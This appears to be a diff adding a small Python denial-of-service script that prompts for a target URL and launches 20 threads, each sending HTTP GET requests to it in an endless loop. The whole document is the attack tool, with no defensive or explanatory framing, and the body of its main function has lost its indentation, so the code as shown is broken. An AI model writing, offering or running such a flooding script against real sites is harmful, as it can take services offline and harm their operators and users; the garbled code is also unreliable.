@@ -1,0 +1,17 @@
+import threading
+import requests
+
+def dos(target):
+while True:
+try:
+res = requests.get(target)
+print("Request sent!")
+except requests.exceptions.ConnectionError:
+print("[!!!] " + "Connection error!")
+
+threads = 20
+url = input("Please enter target url :")
+for i in range(0, threads):
+    thr = threading.Thread(target=dos, args=(url,))
+    thr.start()
+    print(str(i + 1) + " threads started!")
